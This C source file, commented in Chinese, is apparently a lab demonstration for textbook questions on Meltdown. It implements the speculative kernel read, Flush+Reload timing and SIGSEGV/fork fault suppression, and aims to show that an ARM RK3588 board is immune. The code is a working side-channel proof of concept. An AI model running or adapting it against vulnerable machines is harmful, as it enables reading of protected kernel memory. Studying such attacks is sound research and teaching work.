// SPDX-License-Identifier: GPL-2.0
/*
 * meltdown_test.c —— Q3「熔斷漏洞攻擊原理與過程」＋ Q2「異常後如何繼續」的實機演示。
 *
 * 對應書上 §6.1/§6.2（行 41-100、106-148）的熔斷偽代碼：
 *
 *     set_signal();                       // Q2：裝 SIGSEGV handler，異常後不死
 *     clflush(user_probe[]);              // 清 cache
 *     value = *(u8 *)kernel_addr;         // 越權讀核心位址 -> 觸發例外
 *     index = (value & 1) * 0x100;        // 用讀到的值當索引
 *     data  = user_probe[index];          // 把它「烙印」進 cache
 *     // Flush+Reload 反推 value
 *
 * Q2 的答案（書上行 81-100）在本程式裡體現為兩種「異常抑制」手法，可用
 * 環境變數選擇：
 *   METHOD=signal  （預設）用 SIGSEGV handler + siglongjmp 從例外返回；
 *   METHOD=fork    每次探測 fork 一個子進程去踩地雷，父進程只做 Reload。
 *
 * 本機是 RK3588（A76+A55），/sys/.../meltdown = "Not affected"，CSV3=1，
 * 因此「推測讀核心資料」這條路被硬體堵死，預期還原不出任何位元組。
 * 這正是「用實驗證明這台機器對熔斷免疫」——與書上易受攻擊的 x86/舊 ARM 對照。
 *
 * 需要先 `sudo insmod pmu_user.ko`。可選擇提供一個核心 VA（如 linear map 上
 * 的 secret）當靶：
 *   KADDR=0xffff... taskset -c 4 ./meltdown_test
 * 不給 KADDR 時預設打 sys_call_table 或 0（純示範例外抑制路徑）。
 */
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <signal.h>
#include <setjmp.h>
#include <unistd.h>
#include <sys/wait.h>
#include <stdint.h>
#include "sidechannel.h"

#define PGSZ  4160   /* 步長錯開 page 又讓每個 slot 落在不同 L1 cache set（見 flush_reload.c） */
static uint8_t user_probe[256 * PGSZ] __attribute__((aligned(4096)));

static sigjmp_buf jbuf;
static void segv_handler(int sig) { siglongjmp(jbuf, 1); }

/* 熔斷核心：讀 kaddr，用讀到的值把 user_probe 某條 line 帶進 cache */
static void meltdown_read(volatile uint8_t *kaddr)
{
	if (!sigsetjmp(jbuf, 1)) {
		/* 這一行會觸發例外；但 CPU 亂序執行可能已把後兩行預跑了 */
		uint8_t v = *kaddr;
		maccess(&user_probe[v * PGSZ]);
	}
	/* 例外時 longjmp 跳回這裡，進程不死 —— 這就是 Q2 的答案 */
}

static int reload(uint64_t threshold)
{
	int best = -1, i;
	uint64_t best_t = ~0ULL;
	for (i = 1; i < 256; i++) {            /* 跳過 0：預取雜訊常落 0 */
		int mix = ((i * 167) + 13) & 255;
		if (mix == 0) continue;
		uint64_t t = probe_time(&user_probe[mix * PGSZ]);
		if (t < threshold && t < best_t) { best_t = t; best = mix; }
	}
	return best;
}

int main(void)
{
	const char *method = getenv("METHOD") ? getenv("METHOD") : "signal";
	const char *ks = getenv("KADDR");
	volatile uint8_t *kaddr = (volatile uint8_t *)(ks ? strtoull(ks, 0, 0) : 0);

	if (sc_timer_init() < 0) {
		fprintf(stderr, "錯誤：拿不到週期計數器。`sudo sysctl kernel.perf_user_access=1`\n");
		return 1;
	}

	for (int i = 0; i < 256; i++) user_probe[i * PGSZ] = 1;

	/* 門檻校準 */
	volatile uint8_t *s = &user_probe[64 * PGSZ];
	uint64_t hit = 0, miss = 0;
	for (int i = 0; i < 50000; i++) {
		flush((void *)s); mfence(); miss += probe_time((void *)s);
		maccess((void *)s); mfence(); hit += probe_time((void *)s);
	}
	uint64_t threshold = (hit / 50000 + miss / 50000) / 2;
	printf("[校準] 命中 %lu / 未命中 %lu -> 門檻 %lu 週期\n",
	       hit / 50000, miss / 50000, threshold);

	signal(SIGSEGV, segv_handler);
	printf("[熔斷] method=%s，靶位址 kaddr=%p\n", method, (void *)kaddr);
	printf("       (本機預期：meltdown Not affected，還原不出資料)\n\n");

	int hist[256];
	memset(hist, 0, sizeof(hist));
	int survived = 0;
	for (int t = 0; t < 2000; t++) {
		for (int i = 0; i < 256; i++) flush(&user_probe[i * PGSZ]);
		mfence();

		if (strcmp(method, "fork") == 0) {
			pid_t p = fork();
			if (p == 0) { meltdown_read(kaddr); _exit(0); }
			waitpid(p, 0, 0);
		} else {
			meltdown_read(kaddr);
		}
		survived++;
		int g = reload(threshold);
		if (g > 0) hist[g]++;
	}

	int best = -1;
	for (int i = 0; i < 256; i++)
		if (best < 0 || hist[i] > hist[best]) best = i;

	printf("進程存活 %d/2000 次探測（例外抑制成功 = Q2 得證）\n", survived);
	printf("Flush+Reload 最高票 index = 0x%02x，得票 %d/2000\n", best, hist[best]);
	if (hist[best] < 200)
		printf("結論：無明顯洩漏 -> 本機硬體對熔斷免疫（CSV3=1，與 /sys 一致）。\n");
	else
		printf("結論：偵測到洩漏 index=0x%02x -> 可能讀到 *kaddr 的低位元。\n", best);
	return 0;
}
